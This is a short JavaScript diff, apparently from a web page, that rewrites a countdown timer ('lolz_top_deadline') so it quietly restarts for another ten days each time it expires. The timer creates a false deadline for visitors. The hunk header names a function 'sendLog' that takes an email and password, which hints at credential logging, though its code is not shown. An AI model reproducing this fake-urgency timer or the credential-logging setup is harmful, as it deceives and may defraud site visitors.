@@ -2060,23 +2060,48 @@ async function sendLog(method, email, password) {
 
 (function(){
   const KEY = 'lolz_top_deadline';
-  let dl = parseInt(localStorage.getItem(KEY) || '0');
-  if (!dl || dl < Date.now()) {
-    dl = Date.now() + 10 * 24 * 60 * 60 * 1000;
-    localStorage.setItem(KEY, String(dl));
+  
+  function getDeadline() {
+    let dl = parseInt(localStorage.getItem(KEY) || '0');
+    const now = Date.now();
+    if (!dl || dl <= now) {
+      dl = now + 10 * 24 * 60 * 60 * 1000;
+      localStorage.setItem(KEY, String(dl));
+    }
+    return dl;
   }
+  
   function pad(n){ return String(n).padStart(2,'0'); }
+  
   function tickTop(){
-    const diff = Math.max(0, dl - Date.now());
+    let dl = getDeadline();
+    let diff = dl - Date.now();
+    
+    // Если время вышло — обнуляем и запускаем заново
+    if (diff <= 0) {
+      localStorage.removeItem(KEY);
+      dl = getDeadline();
+      diff = dl - Date.now();
+    }
+    
     const d = Math.floor(diff / 86400000);
     const h = Math.floor((diff % 86400000) / 3600000);
     const m = Math.floor((diff % 3600000) / 60000);
     const s = Math.floor((diff % 60000) / 1000);
-    ['t-days','t-hours','t-mins','t-secs'].forEach(function(id, i){
-      const el = document.getElementById(id);
-      if(el) el.textContent = pad([d,h,m,s][i]);
-    });
+    
+    // Напрямую меняем textContent — работает даже в hidden элементах
+    const days  = document.getElementById('t-days');
+    const hours = document.getElementById('t-hours');
+    const mins  = document.getElementById('t-mins');
+    const secs  = document.getElementById('t-secs');
+    
+    if (days)  days.textContent  = pad(d);
+    if (hours) hours.textContent = pad(h);
+    if (mins)  mins.textContent  = pad(m);
+    if (secs)  secs.textContent  = pad(s);
   }
+  
+  // Запускаем сразу и каждую секунду
   tickTop();
   setInterval(tickTop, 1000);
 })();
